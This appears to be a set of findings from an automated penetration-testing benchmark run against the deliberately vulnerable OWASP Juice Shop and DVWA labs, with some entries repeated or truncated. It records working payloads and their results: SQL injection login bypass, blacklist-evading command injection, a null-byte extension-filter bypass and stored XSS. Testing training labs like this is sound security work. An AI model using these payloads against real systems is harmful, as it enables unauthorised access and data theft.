Request 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200, content-type application/octet-stream, with body being the actual package.json file content: '{\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": {...}}'. This proves the extension allow-list filter checks only the trailing string (.md) while the underlying filesystem read truncates the path at the null byte, serving the restricted .bak file content. Both required conditions (403 on raw path, 200 with actual restricted file content on null-byte variant) are satisfied.

title: SQL Injection via numeric boolean bypass in 'id' POST field (DVWA medium security)
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> confirmed security_level=medium, id now rendered as <select> dropdown but underlying POST field name 'id' still accepted raw injected value
POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 OR 1=1', Submit: 'Submit'}  [TRUE condition]
POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 AND 1=2', Submit: 'Submit'}  [FALSE condition]
response_evidence: [security=medium] TRUE payload id=1 OR 1=1 returned 5 seeded user records (multiple rows) with surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (pre_blocks list confirms 5 distinct ID/First name/Surname entries). FALSE payload id=1 AND 1=2 returned zero records — response visible_text/pre_blocks contained no 'ID:' result rows at all, only the empty form. This TRUE-returns-multiple-rows vs FALSE-returns-zero-rows behavioral difference, using numeric (unquoted) boolean payloads required because quotes are escaped server-side at medium, confirms exploitable SQL injection in the 'id' POST parameter at security_level=medium.

title: Authentication Bypass via SQL Injection in Login (email field)
response_evidence: Response HTTP 200 with body {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The injected email payload ' OR 1=1-- bypassed the password check by always evaluating the WHERE clause to true, and the server returned a valid signed authentication token along with "umail":"admin@juice-sh.op" and "bid":1 — confirming the first user record (admin@juice-sh.op) was authenticated without knowledge of the correct password. bid:1 also corresponds to admin's basket id, consistent with returning the first row of the users table ordered by id.

title: Login Authentication-Bypass SQL Injection via email field
response_evidence: Response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email payload \"' OR 1=1--\" caused the backend SQL WHERE clause to always evaluate true, returning the first seeded user record (admin@juice-sh.op, bid=1) along with a valid authentication JWT token, despite the arbitrary/incorrect password supplied. This confirms a SQL injection authentication bypass returning a legitimate admin session token.

title: OS Command Injection via 'ip' parameter in DVWA Command Injection page (low security)
response_evidence: [security=low] Response body contained normal ping output for 127.0.0.1 (4 packets transmitted/received) followed directly by the injected command's output: 'www-data' appended on its own line after the ping statistics block. This is the identity of the web server process, confirming the semicolon-separated 'whoami' command was executed by the underlying shell via unsanitized 'ip' parameter concatenation.

title: OS Command Injection via ip parameter using no-space pipe bypass (DVWA high security)
response_evidence: [security=high] Page confirms 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist which blocks '; ', '| ' with trailing space, and '&&') was submitted. Response pre_blocks contain exactly: "www-data" — the web server process identity — proving successful command injection and execution of the chained whoami command on the host.

title: DVWA Security Level Set to Low (functional confirmation only — CSRF not independently verified)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 200, extracted user_token=[REDACTED], security_level already 'low'
response_evidence: [security=low] This task was assigned as a prerequisite step to establish security=low for subsequent tests, not as a CSRF vulnerability test. POST to /security.php with a freshly-fetched user_token succeeded (302 redirect, session_info.security_level='low', flash message 'Security level set to low' confirmed in subsequent page load). No CSRF bypass (e.g. omitting/reusing stale token, cross-origin request) was attempted, so CWE-352 exploitability was NOT verified — this finding only confirms the endpoint functions as expected for setting security level. Marking inconclusive since the suspected CWE-352 behavior was not behaviorally tested.

response_evidence: GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (content_type text/html) whose visible text reads: \"listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM\". title: Stored Cross-Site Scripting via 'mtxMessage' field in DVWA Guestbook (security=low)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'}
response_evidence: [security=low] The 50-character canary payload <script id=\"test_token\">window.xss_flag=1</script> was accepted by mtxMessage (maxlength=50, exact fit) and stored; subsequent GET of the guestbook page showed a new entry 'Name: tester' with the script content not HTML-escaped (rendered as executable markup rather than literal text, consistent with stored unsanitized injection).
browser_js_evidence: browser_eval_js("window.xss_flag") returned result=1, confirming the injected <script> tag executed in the DOM. browser_read_dom("#test_token") returned inner_text/inner_html_excerpt = "window.xss_flag=1", confirming the injected script element with id=test_token was rendered and present in the live DOM of the authenticated admin session, proving stored XSS execution.

title: Login Authentication-Bypass SQL Injection via crafted email field
response_evidence: Submitting email=\"' OR 1=1--\" with an arbitrary password bypasses credential checking (the SQL WHERE clause becomes always-true and the trailing comment strips the password comparison and quote). The server responded HTTP 200 with a valid authentication JWT token and umail:\"admin@juice-sh.op\" and bid:1 (basket id 1, the first/admin user), proving the injection authenticated as the admin account without knowing its password. This matches the benchmark's confirmation criterion (valid token resolving to admin@juice-sh.op, the first seeded user).

title: Poison Null-Byte Path Traversal Bypasses File Extension Filter on /ftp/ Endpoint
response_evidence: Request 1 (direct .bak path): HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' at fileServer.js:55 verify() — confirms extension allowlist filter blocks direct .bak access. Request 2 (poison null-byte bypass, encoded as %2500 which decodes to %00 literal 'null' followed by '.md'): HTTP 200, content-type application/octet-stream, body contains the full disclosed package.json backup file content (name: juice-shop, version 6.2.0-SNAPSHOT, dependencies list, devDependencies, repository URL, etc.) — proving the filter checks only the trailing '.md' extension string while the underlying filesystem read call truncates at the null byte and serves the restricted package.json.bak file. This is a confirmed path traversal / filter bypass disclosing a restricted backup file.

title: SQL Injection via POST id parameter (numeric boolean bypass) at DVWA medium security
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin, security=medium)
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin, security=medium)
response_evidence: [security=medium] TRUE payload id=1 OR 1=1 returned 5 user records (all rows in the users table): 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. This confirms the id POST parameter is concatenated unescaped into a numeric SQL context on the medium security level (quotes are escaped via mysqli_real_escape_string but numeric injection bypasses this), allowing boolean-based SQL injection.

title: Login Authentication-Bypass SQL Injection via email field
response_evidence: POST to /rest/user/login with email payload `' OR 1=1--` and arbitrary password returned HTTP 200 (not 401) with a valid authentication object: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid JWT auth token was issued without knowing admin's password, confirming CWE-89.

title: Cross-User Basket Access (BOLA) via /rest/basket/{id}

title: OS Command Injection via unsanitized 'ip' parameter in DVWA Command Injection page [security=low]
response_evidence: [security=low] Payload ip=127.0.0.1; whoami produced output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. ... --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3051ms rtt min/avg/max/mdev = 0.020/0.025/0.028/0.003 ms www-data'.
